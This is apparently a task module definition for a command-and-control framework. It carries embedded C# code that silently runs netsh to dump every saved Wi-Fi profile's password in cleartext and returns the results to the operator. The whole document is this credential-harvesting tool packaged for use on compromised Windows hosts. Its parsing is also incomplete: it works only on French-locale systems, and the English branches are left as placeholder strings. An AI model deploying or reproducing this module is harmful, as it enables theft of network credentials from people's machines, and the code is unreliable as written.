- Name: Wifi_passwords
  Aliases: []
  Description: get wifis passwords
  Author: 
      Name: amine brahmi
      Handle: khraoverflow
      Link: https://twitter.com/dr_whoami_
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.IO;
    using System.Text;
    using System.Windows.Forms;
    
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Globalization;

    public static class Task
    {
        public static string Execute()
        {
            string output = "      SSID                      PASSWORD";
            output += Environment.NewLine;
            output += "--------------------   -------------------------" + Environment.NewLine;
            CultureInfo ci = CultureInfo.InstalledUICulture;
            
            try
            {
                List<string> wifis = new List<string>();

                var proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "netsh.exe",
                        Arguments = "wlan show profiles",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };

               


                proc.Start();

                while (!proc.StandardOutput.EndOfStream)
                {
                    string line = proc.StandardOutput.ReadLine();
                    try
                    {
                        string separator = "";

                        separator = ci.Name.Contains("fr") ? "Profil Tous les utilisateurs" : "add english version";

                        if (line.Contains(separator))
                        {
                            string name = line.Substring(2 + line.IndexOf(": "), line.Length - line.IndexOf(": ") - 2);
                            if (name.Length > 1)
                                wifis.Add(name);
                        }
                        
                    }
                    catch (Exception)
                    {

                    }
                    
                    // do something with line
                }

                foreach (string wifi in wifis)
                {

                    var proc2 = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "netsh.exe",
                            Arguments = string.Format(@"wlan show profiles name=""{0}"" key=clear",wifi),
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };




                    proc2.Start();

                    while (!proc2.StandardOutput.EndOfStream)
                    {
                        string line = proc2.StandardOutput.ReadLine();
                        try
                        {
                            string separator = "";

                            separator = ci.Name.Contains("fr") ? "clé" : "add english version (key ?)";

                            if (line.IndexOf(separator) != -1 )
                            {
                                string pass = line.Substring(12 + line.IndexOf("clé"), line.Length - line.IndexOf("clé") - 12);
                                output += wifi + string.Empty.PadLeft(26-wifi.Length,' ') + pass + Environment.NewLine;
                                output += "=================================================" + Environment.NewLine;
                            }
                                
                            
                            
                        }
                        catch (Exception)
                        {

                        }

                        // do something with line
                    }
                }
                return output;

            }
            catch (Exception e)
            {

                return e.Message;
            }
        }
        
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options: []
  ReferenceSourceLibraries: []
  ReferenceAssemblies:
  - Name: System.Drawing.dll
    Location: net40\System.Drawing.dll
    DotNetVersion: Net40
  - Name: System.dll
    Location: net40\System.dll
    DotNetVersion: Net40
  - Name: System.Core.dll
    Location: net40\System.Core.dll
    DotNetVersion: Net40
  - Name: mscorlib.dll
    Location: net40\mscorlib.dll
    DotNetVersion: Net40
  - Name: System.Windows.Forms.dll
    Location: net40\System.Windows.Forms.dll
    DotNetVersion: Net40
  - Name: mscorlib.dll
    Location: net35\mscorlib.dll
    DotNetVersion: Net35
  - Name: System.Core.dll
    Location: net35\System.Core.dll
    DotNetVersion: Net35
  - Name: System.dll
    Location: net35\System.dll
    DotNetVersion: Net35
  - Name: System.Drawing.dll
    Location: net35\System.Drawing.dll
    DotNetVersion: Net35
  - Name: System.Windows.Forms.dll
    Location: net35\System.Windows.Forms.dll
    DotNetVersion: Net35
  EmbeddedResources: []

